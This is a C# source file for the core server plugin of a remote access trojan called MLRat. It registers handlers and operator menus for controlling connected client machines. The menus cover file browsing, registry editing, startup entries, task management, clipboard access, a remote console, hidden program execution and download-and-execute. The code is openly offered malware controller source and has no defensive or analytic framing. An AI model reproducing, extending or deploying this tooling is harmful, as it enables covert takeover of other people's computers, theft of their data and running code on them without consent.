using MLRat.Server;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using ServerPlugin.InterfaceHandle;
using MLManagementServer.Handlers;
using SharedCode.Network;

namespace MLManagementServer
{
    public class ServerPlugin : IServerPlugin
    {
        IServerUIHandler MUIHost;
        public MLPluginInfomation PluginInfomation
        {
            get
            {
                MLPluginInfomation info = new MLPluginInfomation("MLManagement")
                {
                    Developer = "BahNahNah",
                    Description = "Core Plugin"
                };
                return info;
            }
        }

        public void OnClientConnect(IClient client)
        {
            PingHandler.StartPing(client);
        }

        public void OnClientDisconnect(IClient client)
        {
            PingHandler.Disconnect(client);
            RegistryEditorHandler.Disconnect(client);
            FileExplorerHandler.Disconnect(client);
            TaskManagerHandler.Disconnect(client);
            ConsoleHandler.Disconnect(client);
            ClipboardHandler.Disconnect(client);
            StartupManagerhandler.Disconnect(client);
            ConnectionsHandler.Disconnect(client);
        }

        public void OnDataRetrieved(IClient client, object[] data)
        {
            NetworkCommand command = (NetworkCommand)data[0];


            MUIHost.Log(string.Format("Network Command: {0}", data[0]), System.Drawing.Color.Blue);
            if(data.Length > 1)
            MUIHost.Log(string.Format("SubCommand Command: {0}", data[1]), System.Drawing.Color.Blue);

            if (command == NetworkCommand.Pong) PingHandler.EndPing(client);
            if (command == NetworkCommand.RegistryEdit) RegistryEditorHandler.Handle(client, data);
            if (command == NetworkCommand.FileManager) FileExplorerHandler.Handle(client, data);
            if (command == NetworkCommand.TaskManager) TaskManagerHandler.Handle(client, data);
            if (command == NetworkCommand.Console) ConsoleHandler.Handle(client, data);
            if (command == NetworkCommand.Clipboard) ClipboardHandler.Handle(client, data);
            if (command == NetworkCommand.StartupManager) StartupManagerhandler.Handle(client, data);
            if (command == NetworkCommand.Connections) ConnectionsHandler.Handle(client, data);
        }

        public void OnPluginLoad(IServerUIHandler UIHost)
        {
            MUIHost = UIHost;
            FileExplorerHandler.SetUIHost(UIHost);
            TaskManagerHandler.SetUIHost(UIHost);
            ConnectionsHandler.SetUIHost(UIHost);
            UIHost.Log("MLManagement loaded!", System.Drawing.Color.Green);

            PingHandler.Column = UIHost.AddColumn("Ping", "-");
            MLRatContextEntry management = new MLRatContextEntry()
            {
                Text = "Management",
                Icon = "management.png"
            };

            MLRatContextEntry network = new MLRatContextEntry()
            {
                Text = "Network",
                Icon = "network.png"
            };

            management.SubMenus = new MLRatContextEntry[]
            {
                new MLRatContextEntry() { Text = "File Manager", OnClick = FileExplorerHandler.ContextCallback, Icon="folder_explore.png" },
                new MLRatContextEntry() {Text = "Registry Edit", OnClick = RegistryEditorHandler.ContextCallback, Icon="registry.png" },
                new MLRatContextEntry() {Text = "Startup Manager", OnClick = StartupManagerhandler.ContextCallback, Icon="system_time.png" },
                new MLRatContextEntry() { Text = "Task Manager", OnClick = TaskManagerHandler.ContextCallback, Icon="list.png" },
                new MLRatContextEntry() { Text = "Clipboard", OnClick = ClipboardHandler.ContextCallback, Icon="clipboard.png" },
                new MLRatContextEntry() { Text = "Connections", OnClick = ConnectionsHandler.ContextCallback, Icon="connections.png" },
                new MLRatContextEntry() { Text = "Console", OnClick = ConsoleHandler.ContextCallback, Icon="cmd.png" },
                
            };

            network.SubMenus = new MLRatContextEntry[]
            {
                new MLRatContextEntry(){Text = "Ping", OnClick = PingHandler.ContextCallback, Icon="Antena.png"},
                new MLRatContextEntry(){Text = "Run", Icon="monitor-lightning.png", SubMenus = new MLRatContextEntry[]
                {
                        new MLRatContextEntry() {Text = "Normal", OnClick = MiscHandler.ExecuteContextHandler, Icon = "application-blue-lightining.png" },
                        new MLRatContextEntry() {Text = "Hidden", OnClick = MiscHandler.ExecuteHiddenContextHandler, Icon = "application-green-lightining.png" },
                    }
                },
                    new MLRatContextEntry(){Text = "Download And Execute", OnClick = MiscHandler.DownloadAndExecuteContextHandler, Icon="globe.png"},
                    new MLRatContextEntry() { Text = "Client Executable", Icon="cog.png", SubMenus = new MLRatContextEntry[] 
                    {
                        new MLRatContextEntry() { Text = "Disconnect Client", OnClick = MiscHandler.DisconnectHandler, Icon="disconnect.png" },
                        new MLRatContextEntry() { Text = "Restart Client", OnClick = MiscHandler.RestartContextHandler, Icon="restart.png" },
                        new MLRatContextEntry() { Text = "Close Client", OnClick = MiscHandler.CloseContextHandler, Icon="cross.png" }
                    }},
                
            };

            UIHost.AddContext(network, management);
        }
    }
}
